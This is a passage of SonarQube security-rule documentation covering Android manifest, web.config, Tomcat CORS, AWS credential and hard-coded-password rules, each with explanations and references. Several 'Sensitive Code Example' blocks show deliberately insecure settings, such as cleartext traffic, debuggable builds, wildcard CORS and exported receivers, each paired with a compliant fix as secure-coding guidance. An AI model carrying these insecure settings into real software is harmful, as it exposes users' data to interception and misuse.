<p>In <a href="https://docs.spring.io/spring-social-twitter/docs/1.1.0.RELEASE/reference/htmlsingle/">spring social twitter</a>, retrieve secrets from
environment variables:</p>
<pre>
@Configuration
public class SocialConfig implements SocialConfigurer {

    @Override
    public void addConnectionFactories(ConnectionFactoryConfigurer cfConfig, Environment env) {
        cfConfig.addConnectionFactory(new TwitterConnectionFactory(
            env.getProperty("twitter.consumerKey"),
            env.getProperty("twitter.consumerSecret")));  &lt;!-- Compliant --&gt;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5332">
              xml:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
&lt;application
    android:usesCleartextTraffic="true"&gt; &lt;!-- Sensitive --&gt;
&lt;/application&gt;
</pre>
<p>For versions older than Android 9 (API level 28) <code>android:usesCleartextTraffic</code> is implicitely set to <code>true</code>.</p>
<pre>
&lt;application&gt; &lt;!-- Sensitive --&gt;
&lt;/application&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;application
    android:usesCleartextTraffic="false"&gt;
&lt;/application&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/200">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/319">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S3330">
              xml:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>
  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
&lt;session-config&gt;
 &lt;cookie-config&gt;
  &lt;http-only&gt;false&lt;/http-only&gt; &lt;!-- Sensitive --&gt;
 &lt;/cookie-config&gt;
&lt;/session-config&gt;

&lt;session-config&gt;
 &lt;cookie-config&gt; &lt;!-- Sensitive: http-only tag is missing defaulting to false --&gt;
 &lt;/cookie-config&gt;
&lt;/session-config&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;session-config&gt;
 &lt;cookie-config&gt;
  &lt;http-only&gt;true&lt;/http-only&gt; &lt;!-- Compliant --&gt;
 &lt;/cookie-config&gt;
&lt;/session-config&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://owasp.org/www-community/HttpOnly">OWASP HttpOnly</a> </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/1004">MITRE, CWE-1004</a> - Sensitive Cookie Without 'HttpOnly' Flag </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE">HTTPONLY_COOKIE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S4507">
              xml:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production.</p>
<p>Activating a development feature in production can have an important range of consequences depending on its use:</p>
<ul>
  <li> Technical information leak; generally by disclosing verbose logging information to the application’s user. </li>
  <li> Arbitrary code execution; generally with a parameter that will allow the remote debugging or profiling of the application. </li>
</ul>
<p>In all cases, the attack surface of an affected application is increased. In some cases, such features can also make the exploitation of other
unrelated vulnerabilities easier.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The development of the app is completed and the development feature is activated. </li>
  <li> The app is distributed to end users with the `development feature activated </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Applications should be released without any development feature activated. When such features are required when in the development process of the
application, they should only apply to a build variant that is dedicated to development environments. That variant should not be set as the default
build configuration to prevent any unattended development feature exposition.</p>
<h2>Sensitive Code Example</h2>
<p>In <code>AndroidManifest.xml</code> the android debuggable property is set to <code>true</code>. The application will therefore be debuggable.</p>
<pre>
&lt;application
  android:icon="@mipmap/ic_launcher"
  android:label="@string/app_name"
  android:roundIcon="@mipmap/ic_launcher_round"
  android:supportsRtl="true"
  android:debuggable="true"
  android:theme="@style/AppTheme"&gt;
&lt;/application&gt;  &lt;!-- Sensitive --&gt;
</pre>
<p>In a <code>web.config</code> file, the <code>customErrors</code> element’s <code>mode</code> attribute is set to <code>Off</code>. The application
will disclose unnecessarily verbose information to its users upon error.</p>
<pre>
&lt;configuration&gt;
  &lt;system.web&gt;
    &lt;customErrors mode="Off" /&gt; &lt;!-- Sensitive --&gt;
  &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>Compliant Solution</h2>
<p>In <code>AndroidManifest.xml</code> the android debuggable property is set to <code>false</code>:</p>
<pre>
&lt;application
  android:icon="@mipmap/ic_launcher"
  android:label="@string/app_name"
  android:roundIcon="@mipmap/ic_launcher_round"
  android:supportsRtl="true"
  android:debuggable="false"
  android:theme="@style/AppTheme"&gt;
&lt;/application&gt; &lt;!-- Compliant --&gt;
</pre>
<p>In a <code>web.config</code> file, the <code>customErrors</code> element’s <code>mode</code> attribute is set to <code>On</code>:</p>
<pre>
&lt;configuration&gt;
  &lt;system.web&gt;
    &lt;customErrors mode="On" /&gt; &lt;!-- Compliant --&gt;
  &lt;/system.web&gt;
&lt;/configuration&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x12-v7-code_quality_and_build_setting_requirements">Mobile AppSec
  Verification Standard</a> - Code Quality and Build Setting Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m10-extraneous-functionality">OWASP Mobile Top 10 2016 Category M10</a> -
  Extraneous Functionality </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/215">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
  <li> <a href="https://developer.android.com/studio/publish/preparing">developer.android.com</a> - Prepare for release </li>
  <li> <a
  href="https://learn.microsoft.com/en-us/aspnet/web-forms/overview/getting-started/getting-started-with-aspnet-45-web-forms/aspnet-error-handling">learn.microsoft.com</a> - ASP.NET Error Handling </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S6361">
              xml:S6361
            </a>
          </td>
          <td>
            <details>
              <p><code>android:permission</code> is used to set a single permission for both reading and writing data from a content provider. In regard to the
Principle of Least Privilege, client applications that consume the content provider should only have the necessary privileges to complete their tasks.
As <code>android:permission</code> grants both read and write access, it prevents client applications from applying this principle. In practice, it
means client applications that require read-only access will have to ask for more privileges than what they need: the content provider will always
grant read and write together.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some client applications consuming the content provider may only require read permission. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid using <code>android:permission</code> attribute alone. Instead <code>android:readPermission</code> and
  <code>android:writePermission</code> attributes to define separate read and write permissions. </li>
  <li> Avoid using the same permission for <code>android:readPermission</code> and <code>android:writePermission</code> attributes. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
&lt;provider
  android:authorities="com.example.app.Provider"
  android:name="com.example.app.Provider"
  android:permission="com.example.app.PERMISSION"  &lt;!-- Sensitive --&gt;
  android:exported="true"/&gt;
</pre>
<pre>
&lt;provider
  android:authorities="com.example.app.Provider"
  android:name="com.example.app.Provider"
  android:readPermission="com.example.app.PERMISSION"  &lt;!-- Sensitive --&gt;
  android:writePermission="com.example.app.PERMISSION" &lt;!-- Sensitive --&gt;
  android:exported="true"/&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;provider
  android:authorities="com.example.app.MyProvider"
  android:name="com.example.app.MyProvider"
  android:readPermission="com.example.app.READ_PERMISSION"
  android:writePermission="com.example.app.WRITE_PERMISSION"
  android:exported="true"/&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions">developer.android.com</a> - Implementing
  content provider permissions </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  platform usage </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m6-insecure-authorization">OWASP Mobile Top 10 2016 Category M6</a> - Insecure
  Authorization </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/1220">MITRE, CWE-1220</a> - Insufficient Granularity of Access Control </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5322">
              xml:S5322
            </a>
          </td>
          <td>
            <details>
              <p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led
in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1677">CVE-2019-1677</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1275">CVE-2015-1275</a> </li>
</ul>
<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will
start the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>
<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications
that can send broadcasts to the receiver.</p>
<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a
broadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a
message to the receiver.</p>
<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The data extracted from intents is not sanitized. </li>
  <li> Intents broadcast is not restricted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See the <a
href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
&lt;receiver android:name=".MyBroadcastReceiver" android:exported="true"&gt;  &lt;!-- Sensitive --&gt;
    &lt;intent-filter&gt;
        &lt;action android:name="android.intent.action.AIRPLANE_MODE"/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</pre>
<h2>Compliant Solution</h2>
<p>Enforce permissions:</p>
<pre>
&lt;receiver android:name=".MyBroadcastReceiver"
    android:permission="android.permission.SEND_SMS"
    android:exported="true"&gt;
    &lt;intent-filter&gt;
        &lt;action android:name="android.intent.action.AIRPLANE_MODE"/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</pre>
<p>Do not export the receiver and only receive system intents:</p>
<pre>
&lt;receiver android:name=".MyBroadcastReceiver" android:exported="false"&gt;
    &lt;intent-filter&gt;
        &lt;action android:name="android.intent.action.AIRPLANE_MODE"/&gt;
    &lt;/intent-filter&gt;
&lt;/receiver&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/925">MITRE, CWE-925</a> - Improper Verification of Intent by Broadcast Receiver </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/926">MITRE, CWE-926</a> - Improper Export of Android Application Components </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S6358">
              xml:S6358
            </a>
          </td>
          <td>
            <details>
              <p>Android has a built-in backup mechanism that can save and restore application data. When application backup is enabled, local data from your
application can be exported to Google Cloud or to an external device via <code>adb backup</code>. Enabling Android backup exposes your application to
disclosure of sensitive data. It can also lead to corruption of local data when restoration is performed from an untrusted source.</p>
<p>By default application backup is enabled and it includes:</p>
<ul>
  <li> Shared preferences files </li>
  <li> Files saved in one of the paths returned by
    <ul>
      <li> <a href="https://developer.android.com/reference/android/content/Context#getDatabasePath(java.lang.String)">getDatabasePath(String)</a>
      </li>
      <li> <a href="https://developer.android.com/reference/android/content/Context#getFilesDir()">getFilesDir()</a> </li>
      <li> <a href="https://developer.android.com/reference/android/content/Context#getDir(java.lang.String,%20int)">getDir(String, int)</a> </li>
      <li> <a
      href="https://developer.android.com/reference/android/content/Context#getExternalFilesDir(java.lang.String)">getExternalFilesDir(String)</a>
      </li>
    </ul>  </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application backup is enabled and sensitive data is stored in local files, local databases, or shared preferences. </li>
  <li> Your application never validates data from files that are included in backups. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Disable application backup unless it is required for your application to work properly. </li>
  <li> Narrow the scope of backed-up files by using either
    <ul>
      <li> backup rules (see <code>android:fullBackupContent</code> attribute). </li>
      <li> a custom <code>BackupAgent</code>. </li>
      <li> the dedicated <code>no_backup</code> folder (see <code>android.content.Context#getNoBackupFilesDir()</code>). </li>
    </ul>  </li>
  <li> Do not back up local data containing sensitive information unless they are properly encrypted. </li>
  <li> Make sure that the keys used to encrypt backup data are not included in the backup. </li>
  <li> Validate data from backed-up files. They should be considered untrusted as they could have been restored from an untrusted source. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
&lt;application
    android:allowBackup="true"&gt; &lt;!-- Sensitive --&gt;
&lt;/application&gt;
</pre>
<h2>Compliant Solution</h2>
<p>Disable application backup.</p>
<pre>
&lt;application
    android:allowBackup="false"&gt;
&lt;/application&gt;
</pre>
<p>If targeting Android 6.0 or above (API level 23), define files to include/exclude from the application backup.</p>
<pre>
&lt;application
    android:allowBackup="true"
    android:fullBackupContent="@xml/backup.xml"&gt;
&lt;/application&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://developer.android.com/guide/topics/data/autobackup">Back up user data with Auto Backup</a> </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  platform usage </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/312">MITRE, CWE-922</a> - Insecure Storage of Sensitive Information </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=xml:S5122">
              xml:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269">CVE-2018-0269</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460">CVE-2017-14460</a> </li>
</ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>
  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>
  <li> Your access control policy is dynamically defined by a user-controlled input like <a
  href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin"><code>origin</code></a> header. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>
  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
&lt;!-- Tomcat 7+ Cors Filter --&gt;
&lt;filter&gt;
  &lt;filter-name&gt;CorsFilter&lt;/filter-name&gt;
  &lt;filter-class&gt;org.apache.catalina.filters.CorsFilter&lt;/filter-class&gt;
  &lt;init-param&gt;
    &lt;param-name&gt;cors.allowed.origins&lt;/param-name&gt;
    &lt;param-value&gt;*&lt;/param-value&gt; &lt;!-- Sensitive --&gt;
  &lt;/init-param&gt;
&lt;/filter&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;!-- Tomcat 7+ Cors Filter --&gt;
&lt;filter&gt;
  &lt;filter-name&gt;CorsFilter&lt;/filter-name&gt;
  &lt;filter-class&gt;org.apache.catalina.filters.CorsFilter&lt;/filter-class&gt;
  &lt;init-param&gt;
    &lt;param-name&gt;cors.allowed.origins&lt;/param-name&gt;
    &lt;param-value&gt;https://trusted1.org,https://trusted2.org&lt;/param-value&gt; &lt;!-- Compliant --&gt;
  &lt;/init-param&gt;
&lt;/filter&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org</a> - CORS </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">developer.mozilla.org</a> - Same origin policy </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/346">MITRE, CWE-346</a> - Origin Validation Error </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/942">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6263">
              java:S6263
            </a>
          </td>
          <td>
            <details>
              <p>In AWS, long-term access keys will be valid until you manually revoke them. This makes them highly sensitive as any exposure can have serious
consequences and should be used with care.</p>
<p>This rule will trigger when encountering an instantiation of <code>com.amazonaws.auth.BasicAWSCredentials</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The access key is used directly in an application or AWS CLI script running on an Amazon EC2 instance. </li>
  <li> Cross-account access is needed. </li>
  <li> The access keys need to be embedded within a mobile application. </li>
  <li> Existing identity providers (SAML 2.0, on-premises identity store) already exists. </li>
</ul>
<p>For more information, see <a href="https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html#use-roles">Use IAM roles
instead of long-term access keys</a>.</p>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Consider using IAM roles or other features of the AWS Security Token Service that provide temporary credentials, limiting the risks.</p>
<h2>Sensitive Code Example</h2>
<pre>
import com.amazonaws.auth.AWSCredentials;
import com.amazonaws.auth.BasicAWSCredentials;
// ...

AWSCredentials awsCredentials = new BasicAWSCredentials(accessKeyId, secretAccessKey);
</pre>
<h2>Compliant Solution</h2>
<p>Example for AWS STS (see <a href="https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/prog-services-sts.html">Getting Temporary Credentials
with AWS STS</a>).</p>
<pre>
BasicSessionCredentials sessionCredentials = new BasicSessionCredentials(
   session_creds.getAccessKeyId(),
   session_creds.getSecretAccessKey(),
   session_creds.getSessionToken());
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html">Best practices for managing AWS access keys</a>
  </li>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html">Managing access keys for IAM users</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=apex:S2068">
              apex:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
